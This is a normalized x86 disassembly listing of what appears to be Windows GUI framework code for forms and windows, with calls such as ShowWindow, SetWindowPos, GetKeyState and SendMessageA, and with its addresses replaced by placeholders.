mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_43a170
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f070
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43a170
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_44e650
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_4032ec
sub_44f0c8
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_43a6a4
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_44f0f4
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_44e6b4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44f110
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_446aac
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_446aac
sub_44f150
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_44f188
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f00
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_44f1bc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44f30d
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f314
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_44f110
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_430850
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412404
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_433488
lea eax [ ebp - 0x1c ]
call sub_4067cc
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_44f110
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44f150
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_453820
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_453888
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_453888
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_44f188
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412404
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_433488
lea eax [ ebp - 0x1c ]
call sub_4067cc
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4537b8
test [ esi + 0x228 ] 0x8
je r-xdata
sub_44f31c
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_44f390
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_44f3bc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43870c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44d3cc
lea edx [ ebp - 0x14 ]
call sub_450b94
push ebp
mov eax [ ebp - 0x4 ]
call sub_44d3cc
lea edx [ ebp - 0x24 ]
call sub_450b94
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_44f390
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44d3cc
lea edx [ ebp - 0x24 ]
call sub_450b94
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_44f390
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44f390
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_44f390
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_44f474
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4032ec
pop esi
pop ebx
retn
sub_44f498
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_4032ec
pop esi
pop ebx
retn
sub_44f4bc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_4395ec
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_43a6a4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_43a6a4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_44f558
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fac2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_453c6c
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_44faa5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44faac
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
push ebp
push j_sub_403578#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_44f610
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e704
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4376c8
jmp r-xdata
mov eax [ rw-data ]
call sub_450df0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_433374
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43a170
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_450de4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4333b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a170
call sub_44a360
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_450e20
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_433374
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_450df0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_433bd0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_450e14
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4333b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_450de4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44d9b4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44d9b4
jmp r-xdata
sub_44f615
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_453380
call sub_4038e0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_450df0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_433374
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_450de4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4333b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_450e20
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_433374
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_450df0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44faac
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_433bd0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_450e14
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4333b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_450de4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44d9b4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44d9b4
jmp r-xdata
sub_44f9b1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_453380
call sub_4038e0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e704
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4376c8
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43a170
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44faac
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a170
call sub_44a360
mov ebx eax
sub_44faf8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_44fb50
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c984
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fbae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_44fbbc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_4032ec
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44fbe8
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45336c
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_4032ec
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_44fd88
jmp r-xdata
mov eax ebx
call sub_44fe24
mov dl 0x1
mov eax ebx
call sub_44d974
jmp r-xdata
sub_44fc8c
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_44d300
mov esi eax
dec esi
